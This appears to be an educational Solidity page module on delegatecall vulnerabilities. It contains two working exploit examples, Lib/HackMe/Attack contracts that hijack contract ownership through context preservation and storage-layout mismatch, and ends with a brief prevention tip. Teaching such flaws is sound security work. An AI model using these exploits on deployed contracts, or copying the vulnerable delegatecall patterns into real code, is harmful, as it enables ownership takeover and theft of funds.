// metadata
export const version = "0.8.26"
export const title = "Delegatecall"
export const description = "An example of exploits using delegatecall in Solidity"
export const cyfrinLink =
  "https://www.cyfrin.io/glossary/delegatecall-hack-solidity-code-example"

export const keywords = ["hack", "security", "delegatecall"]

export const codes = [
  {
    fileName: "Delegatecall_1.sol",
    code: "Ly8gU1BEWC1MaWNlbnNlLUlkZW50aWZpZXI6IE1JVApwcmFnbWEgc29saWRpdHkgXjAuOC4yNjsKCi8qCkhhY2tNZSBpcyBhIGNvbnRyYWN0IHRoYXQgdXNlcyBkZWxlZ2F0ZWNhbGwgdG8gZXhlY3V0ZSBjb2RlLgpJdCBpcyBub3Qgb2J2aW91cyB0aGF0IHRoZSBvd25lciBvZiBIYWNrTWUgY2FuIGJlIGNoYW5nZWQgc2luY2UgdGhlcmUgaXMgbm8KZnVuY3Rpb24gaW5zaWRlIEhhY2tNZSB0byBkbyBzby4gSG93ZXZlciBhbiBhdHRhY2tlciBjYW4gaGlqYWNrIHRoZQpjb250cmFjdCBieSBleHBsb2l0aW5nIGRlbGVnYXRlY2FsbC4gTGV0J3Mgc2VlIGhvdy4KCjEuIEFsaWNlIGRlcGxveXMgTGliCjIuIEFsaWNlIGRlcGxveXMgSGFja01lIHdpdGggYWRkcmVzcyBvZiBMaWIKMy4gRXZlIGRlcGxveXMgQXR0YWNrIHdpdGggYWRkcmVzcyBvZiBIYWNrTWUKNC4gRXZlIGNhbGxzIEF0dGFjay5hdHRhY2soKQo1LiBBdHRhY2sgaXMgbm93IHRoZSBvd25lciBvZiBIYWNrTWUKCldoYXQgaGFwcGVuZWQ/CkV2ZSBjYWxsZWQgQXR0YWNrLmF0dGFjaygpLgpBdHRhY2sgY2FsbGVkIHRoZSBmYWxsYmFjayBmdW5jdGlvbiBvZiBIYWNrTWUgc2VuZGluZyB0aGUgZnVuY3Rpb24Kc2VsZWN0b3Igb2YgcHduKCkuIEhhY2tNZSBmb3J3YXJkcyB0aGUgY2FsbCB0byBMaWIgdXNpbmcgZGVsZWdhdGVjYWxsLgpIZXJlIG1zZy5kYXRhIGNvbnRhaW5zIHRoZSBmdW5jdGlvbiBzZWxlY3RvciBvZiBwd24oKS4KVGhpcyB0ZWxscyBTb2xpZGl0eSB0byBjYWxsIHRoZSBmdW5jdGlvbiBwd24oKSBpbnNpZGUgTGliLgpUaGUgZnVuY3Rpb24gcHduKCkgdXBkYXRlcyB0aGUgb3duZXIgdG8gbXNnLnNlbmRlci4KRGVsZWdhdGVjYWxsIHJ1bnMgdGhlIGNvZGUgb2YgTGliIHVzaW5nIHRoZSBjb250ZXh0IG9mIEhhY2tNZS4KVGhlcmVmb3JlIEhhY2tNZSdzIHN0b3JhZ2Ugd2FzIHVwZGF0ZWQgdG8gbXNnLnNlbmRlciB3aGVyZSBtc2cuc2VuZGVyIGlzIHRoZQpjYWxsZXIgb2YgSGFja01lLCBpbiB0aGlzIGNhc2UgQXR0YWNrLgoqLwoKY29udHJhY3QgTGliIHsKICAgIGFkZHJlc3MgcHVibGljIG93bmVyOwoKICAgIGZ1bmN0aW9uIHB3bigpIHB1YmxpYyB7CiAgICAgICAgb3duZXIgPSBtc2cuc2VuZGVyOwogICAgfQp9Cgpjb250cmFjdCBIYWNrTWUgewogICAgYWRkcmVzcyBwdWJsaWMgb3duZXI7CiAgICBMaWIgcHVibGljIGxpYjsKCiAgICBjb25zdHJ1Y3RvcihMaWIgX2xpYikgewogICAgICAgIG93bmVyID0gbXNnLnNlbmRlcjsKICAgICAgICBsaWIgPSBMaWIoX2xpYik7CiAgICB9CgogICAgZmFsbGJhY2soKSBleHRlcm5hbCBwYXlhYmxlIHsKICAgICAgICBhZGRyZXNzKGxpYikuZGVsZWdhdGVjYWxsKG1zZy5kYXRhKTsKICAgIH0KfQoKY29udHJhY3QgQXR0YWNrIHsKICAgIGFkZHJlc3MgcHVibGljIGhhY2tNZTsKCiAgICBjb25zdHJ1Y3RvcihhZGRyZXNzIF9oYWNrTWUpIHsKICAgICAgICBoYWNrTWUgPSBfaGFja01lOwogICAgfQoKICAgIGZ1bmN0aW9uIGF0dGFjaygpIHB1YmxpYyB7CiAgICAgICAgaGFja01lLmNhbGwoYWJpLmVuY29kZVdpdGhTaWduYXR1cmUoInB3bigpIikpOwogICAgfQp9Cg==",
  },
  {
    fileName: "Delegatecall_2.sol",
    code: "Ly8gU1BEWC1MaWNlbnNlLUlkZW50aWZpZXI6IE1JVApwcmFnbWEgc29saWRpdHkgXjAuOC4yNjsKCi8qClRoaXMgaXMgYSBtb3JlIHNvcGhpc3RpY2F0ZWQgdmVyc2lvbiBvZiB0aGUgcHJldmlvdXMgZXhwbG9pdC4KCjEuIEFsaWNlIGRlcGxveXMgTGliIGFuZCBIYWNrTWUgd2l0aCB0aGUgYWRkcmVzcyBvZiBMaWIKMi4gRXZlIGRlcGxveXMgQXR0YWNrIHdpdGggdGhlIGFkZHJlc3Mgb2YgSGFja01lCjMuIEV2ZSBjYWxscyBBdHRhY2suYXR0YWNrKCkKNC4gQXR0YWNrIGlzIG5vdyB0aGUgb3duZXIgb2YgSGFja01lCgpXaGF0IGhhcHBlbmVkPwpOb3RpY2UgdGhhdCB0aGUgc3RhdGUgdmFyaWFibGVzIGFyZSBub3QgZGVmaW5lZCBpbiB0aGUgc2FtZSBtYW5uZXIgaW4gTGliCmFuZCBIYWNrTWUuIFRoaXMgbWVhbnMgdGhhdCBjYWxsaW5nIExpYi5kb1NvbWV0aGluZygpIHdpbGwgY2hhbmdlIHRoZSBmaXJzdApzdGF0ZSB2YXJpYWJsZSBpbnNpZGUgSGFja01lLCB3aGljaCBoYXBwZW5zIHRvIGJlIHRoZSBhZGRyZXNzIG9mIGxpYi4KCkluc2lkZSBhdHRhY2soKSwgdGhlIGZpcnN0IGNhbGwgdG8gZG9Tb21ldGhpbmcoKSBjaGFuZ2VzIHRoZSBhZGRyZXNzIG9mIGxpYgpzdG9yZWQgaW4gSGFja01lLiBBZGRyZXNzIG9mIGxpYiBpcyBub3cgc2V0IHRvIEF0dGFjay4KVGhlIHNlY29uZCBjYWxsIHRvIGRvU29tZXRoaW5nKCkgY2FsbHMgQXR0YWNrLmRvU29tZXRoaW5nKCkgYW5kIGhlcmUgd2UKY2hhbmdlIHRoZSBvd25lci4KKi8KCmNvbnRyYWN0IExpYiB7CiAgICB1aW50MjU2IHB1YmxpYyBzb21lTnVtYmVyOwoKICAgIGZ1bmN0aW9uIGRvU29tZXRoaW5nKHVpbnQyNTYgX251bSkgcHVibGljIHsKICAgICAgICBzb21lTnVtYmVyID0gX251bTsKICAgIH0KfQoKY29udHJhY3QgSGFja01lIHsKICAgIGFkZHJlc3MgcHVibGljIGxpYjsKICAgIGFkZHJlc3MgcHVibGljIG93bmVyOwogICAgdWludDI1NiBwdWJsaWMgc29tZU51bWJlcjsKCiAgICBjb25zdHJ1Y3RvcihhZGRyZXNzIF9saWIpIHsKICAgICAgICBsaWIgPSBfbGliOwogICAgICAgIG93bmVyID0gbXNnLnNlbmRlcjsKICAgIH0KCiAgICBmdW5jdGlvbiBkb1NvbWV0aGluZyh1aW50MjU2IF9udW0pIHB1YmxpYyB7CiAgICAgICAgbGliLmRlbGVnYXRlY2FsbChhYmkuZW5jb2RlV2l0aFNpZ25hdHVyZSgiZG9Tb21ldGhpbmcodWludDI1NikiLCBfbnVtKSk7CiAgICB9Cn0KCmNvbnRyYWN0IEF0dGFjayB7CiAgICAvLyBNYWtlIHN1cmUgdGhlIHN0b3JhZ2UgbGF5b3V0IGlzIHRoZSBzYW1lIGFzIEhhY2tNZQogICAgLy8gVGhpcyB3aWxsIGFsbG93IHVzIHRvIGNvcnJlY3RseSB1cGRhdGUgdGhlIHN0YXRlIHZhcmlhYmxlcwogICAgYWRkcmVzcyBwdWJsaWMgbGliOwogICAgYWRkcmVzcyBwdWJsaWMgb3duZXI7CiAgICB1aW50MjU2IHB1YmxpYyBzb21lTnVtYmVyOwoKICAgIEhhY2tNZSBwdWJsaWMgaGFja01lOwoKICAgIGNvbnN0cnVjdG9yKEhhY2tNZSBfaGFja01lKSB7CiAgICAgICAgaGFja01lID0gSGFja01lKF9oYWNrTWUpOwogICAgfQoKICAgIGZ1bmN0aW9uIGF0dGFjaygpIHB1YmxpYyB7CiAgICAgICAgLy8gb3ZlcnJpZGUgYWRkcmVzcyBvZiBsaWIKICAgICAgICBoYWNrTWUuZG9Tb21ldGhpbmcodWludDI1Nih1aW50MTYwKGFkZHJlc3ModGhpcykpKSk7CiAgICAgICAgLy8gcGFzcyBhbnkgbnVtYmVyIGFzIGlucHV0LCB0aGUgZnVuY3Rpb24gZG9Tb21ldGhpbmcoKSBiZWxvdyB3aWxsCiAgICAgICAgLy8gYmUgY2FsbGVkCiAgICAgICAgaGFja01lLmRvU29tZXRoaW5nKDEpOwogICAgfQoKICAgIC8vIGZ1bmN0aW9uIHNpZ25hdHVyZSBtdXN0IG1hdGNoIEhhY2tNZS5kb1NvbWV0aGluZygpCiAgICBmdW5jdGlvbiBkb1NvbWV0aGluZyh1aW50MjU2IF9udW0pIHB1YmxpYyB7CiAgICAgICAgb3duZXIgPSBtc2cuc2VuZGVyOwogICAgfQp9Cg==",
  },
]

const html = `<h3>Vulnerability</h3>
<p><code>delegatecall</code> is tricky to use and wrong usage or incorrect understanding
can lead to devastating results.</p>
<p>You must keep 2 things in mind when using <code>delegatecall</code></p>
<ol>
<li><code>delegatecall</code> preserves context (storage, caller, etc...)</li>
<li>storage layout must be the same for the contract calling <code>delegatecall</code> and the contract getting called</li>
</ol>
<pre><code class="language-solidity"><span class="hljs-comment">// SPDX-License-Identifier: MIT</span>
<span class="hljs-meta"><span class="hljs-keyword">pragma</span> <span class="hljs-keyword">solidity</span> ^0.8.26;</span>

<span class="hljs-comment">/*
HackMe is a contract that uses delegatecall to execute code.
It is not obvious that the owner of HackMe can be changed since there is no
function inside HackMe to do so. However an attacker can hijack the
contract by exploiting delegatecall. Let&#x27;s see how.

1. Alice deploys Lib
2. Alice deploys HackMe with address of Lib
3. Eve deploys Attack with address of HackMe
4. Eve calls Attack.attack()
5. Attack is now the owner of HackMe

What happened?
Eve called Attack.attack().
Attack called the fallback function of HackMe sending the function
selector of pwn(). HackMe forwards the call to Lib using delegatecall.
Here msg.data contains the function selector of pwn().
This tells Solidity to call the function pwn() inside Lib.
The function pwn() updates the owner to msg.sender.
Delegatecall runs the code of Lib using the context of HackMe.
Therefore HackMe&#x27;s storage was updated to msg.sender where msg.sender is the
caller of HackMe, in this case Attack.
*/</span>

<span class="hljs-class"><span class="hljs-keyword">contract</span> <span class="hljs-title">Lib</span> </span>{
    <span class="hljs-keyword">address</span> <span class="hljs-keyword">public</span> owner;

    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">pwn</span>(<span class="hljs-params"></span>) <span class="hljs-title"><span class="hljs-keyword">public</span></span> </span>{
        owner <span class="hljs-operator">=</span> <span class="hljs-built_in">msg</span>.<span class="hljs-built_in">sender</span>;
    }
}

<span class="hljs-class"><span class="hljs-keyword">contract</span> <span class="hljs-title">HackMe</span> </span>{
    <span class="hljs-keyword">address</span> <span class="hljs-keyword">public</span> owner;
    Lib <span class="hljs-keyword">public</span> lib;

    <span class="hljs-function"><span class="hljs-keyword">constructor</span>(<span class="hljs-params">Lib _lib</span>) </span>{
        owner <span class="hljs-operator">=</span> <span class="hljs-built_in">msg</span>.<span class="hljs-built_in">sender</span>;
        lib <span class="hljs-operator">=</span> Lib(_lib);
    }

    <span class="hljs-function"><span class="hljs-keyword">fallback</span>(<span class="hljs-params"></span>) <span class="hljs-title"><span class="hljs-keyword">external</span></span> <span class="hljs-title"><span class="hljs-keyword">payable</span></span> </span>{
        <span class="hljs-keyword">address</span>(lib).<span class="hljs-built_in">delegatecall</span>(<span class="hljs-built_in">msg</span>.<span class="hljs-built_in">data</span>);
    }
}

<span class="hljs-class"><span class="hljs-keyword">contract</span> <span class="hljs-title">Attack</span> </span>{
    <span class="hljs-keyword">address</span> <span class="hljs-keyword">public</span> hackMe;

    <span class="hljs-function"><span class="hljs-keyword">constructor</span>(<span class="hljs-params"><span class="hljs-keyword">address</span> _hackMe</span>) </span>{
        hackMe <span class="hljs-operator">=</span> _hackMe;
    }

    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">attack</span>(<span class="hljs-params"></span>) <span class="hljs-title"><span class="hljs-keyword">public</span></span> </span>{
        hackMe.<span class="hljs-built_in">call</span>(<span class="hljs-built_in">abi</span>.<span class="hljs-built_in">encodeWithSignature</span>(<span class="hljs-string">"pwn()"</span>));
    }
}
</code></pre><p>Here is another example.</p>
<p>You will need to understand how Solidity stores
state variables before you can understand this exploit.</p>
<pre><code class="language-solidity"><span class="hljs-comment">// SPDX-License-Identifier: MIT</span>
<span class="hljs-meta"><span class="hljs-keyword">pragma</span> <span class="hljs-keyword">solidity</span> ^0.8.26;</span>

<span class="hljs-comment">/*
This is a more sophisticated version of the previous exploit.

1. Alice deploys Lib and HackMe with the address of Lib
2. Eve deploys Attack with the address of HackMe
3. Eve calls Attack.attack()
4. Attack is now the owner of HackMe

What happened?
Notice that the state variables are not defined in the same manner in Lib
and HackMe. This means that calling Lib.doSomething() will change the first
state variable inside HackMe, which happens to be the address of lib.

Inside attack(), the first call to doSomething() changes the address of lib
stored in HackMe. Address of lib is now set to Attack.
The second call to doSomething() calls Attack.doSomething() and here we
change the owner.
*/</span>

<span class="hljs-class"><span class="hljs-keyword">contract</span> <span class="hljs-title">Lib</span> </span>{
    <span class="hljs-keyword">uint256</span> <span class="hljs-keyword">public</span> someNumber;

    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">doSomething</span>(<span class="hljs-params"><span class="hljs-keyword">uint256</span> _num</span>) <span class="hljs-title"><span class="hljs-keyword">public</span></span> </span>{
        someNumber <span class="hljs-operator">=</span> _num;
    }
}

<span class="hljs-class"><span class="hljs-keyword">contract</span> <span class="hljs-title">HackMe</span> </span>{
    <span class="hljs-keyword">address</span> <span class="hljs-keyword">public</span> lib;
    <span class="hljs-keyword">address</span> <span class="hljs-keyword">public</span> owner;
    <span class="hljs-keyword">uint256</span> <span class="hljs-keyword">public</span> someNumber;

    <span class="hljs-function"><span class="hljs-keyword">constructor</span>(<span class="hljs-params"><span class="hljs-keyword">address</span> _lib</span>) </span>{
        lib <span class="hljs-operator">=</span> _lib;
        owner <span class="hljs-operator">=</span> <span class="hljs-built_in">msg</span>.<span class="hljs-built_in">sender</span>;
    }

    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">doSomething</span>(<span class="hljs-params"><span class="hljs-keyword">uint256</span> _num</span>) <span class="hljs-title"><span class="hljs-keyword">public</span></span> </span>{
        lib.<span class="hljs-built_in">delegatecall</span>(<span class="hljs-built_in">abi</span>.<span class="hljs-built_in">encodeWithSignature</span>(<span class="hljs-string">"doSomething(uint256)"</span>, _num));
    }
}

<span class="hljs-class"><span class="hljs-keyword">contract</span> <span class="hljs-title">Attack</span> </span>{
    <span class="hljs-comment">// Make sure the storage layout is the same as HackMe</span>
    <span class="hljs-comment">// This will allow us to correctly update the state variables</span>
    <span class="hljs-keyword">address</span> <span class="hljs-keyword">public</span> lib;
    <span class="hljs-keyword">address</span> <span class="hljs-keyword">public</span> owner;
    <span class="hljs-keyword">uint256</span> <span class="hljs-keyword">public</span> someNumber;

    HackMe <span class="hljs-keyword">public</span> hackMe;

    <span class="hljs-function"><span class="hljs-keyword">constructor</span>(<span class="hljs-params">HackMe _hackMe</span>) </span>{
        hackMe <span class="hljs-operator">=</span> HackMe(_hackMe);
    }

    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">attack</span>(<span class="hljs-params"></span>) <span class="hljs-title"><span class="hljs-keyword">public</span></span> </span>{
        <span class="hljs-comment">// override address of lib</span>
        hackMe.doSomething(<span class="hljs-keyword">uint256</span>(<span class="hljs-keyword">uint160</span>(<span class="hljs-keyword">address</span>(<span class="hljs-built_in">this</span>))));
        <span class="hljs-comment">// pass any number as input, the function doSomething() below will</span>
        <span class="hljs-comment">// be called</span>
        hackMe.doSomething(<span class="hljs-number">1</span>);
    }

    <span class="hljs-comment">// function signature must match HackMe.doSomething()</span>
    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">doSomething</span>(<span class="hljs-params"><span class="hljs-keyword">uint256</span> _num</span>) <span class="hljs-title"><span class="hljs-keyword">public</span></span> </span>{
        owner <span class="hljs-operator">=</span> <span class="hljs-built_in">msg</span>.<span class="hljs-built_in">sender</span>;
    }
}
</code></pre><h3>Preventative Techniques</h3>
<ul>
<li>Use stateless <code>Library</code></li>
</ul>
`

export default html
